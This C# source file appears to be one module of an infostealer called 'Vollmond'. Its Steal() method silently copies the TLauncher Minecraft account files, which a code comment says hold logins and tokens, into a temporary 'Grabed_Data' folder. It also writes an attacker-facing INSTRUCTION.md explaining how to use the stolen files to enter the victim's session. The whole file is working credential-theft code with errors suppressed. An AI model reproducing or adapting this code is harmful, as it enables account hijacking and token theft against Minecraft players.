namespace Vollmond.Minecraft
{
    internal class Tlauncher
    {
        public static void Steal()
        {
            try
            {
                string tlauncherPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".minecraft");
                string dataPath = Path.Combine(Path.GetTempPath(), "Grabed_Data", "Minecraft", "Tlauncher");

                if (Directory.Exists(tlauncherPath))
                {
                    Directory.CreateDirectory(dataPath);

                    File.Copy(Path.Combine(tlauncherPath, "TlauncherProfiles.json"), Path.Combine(dataPath, "TlauncherProfiles.json")); // Acoounts data (logins, tokens)
                    File.Copy(Path.Combine(tlauncherPath, "launcher_profiles.json"), Path.Combine(dataPath, "launcher_profiles.json"));

                    string instruction =
                        """
                                ## How to enter to the session

                _**You have two options**_


                1. __Simple copy this file with replace in C:\Users\User\Appdata\Roaming\.minecraft - In this option you shall lost existed accounts__
                2. __If you dont wanna lose your existed acoounts - You can take accounts data from this files and enter it in your files. You can use tools for work with json__ 
                """;

                    File.WriteAllText(Path.Combine(dataPath, "INSTRUCTION.md"), instruction);
                }
            }
            catch { }
        }
    }
}
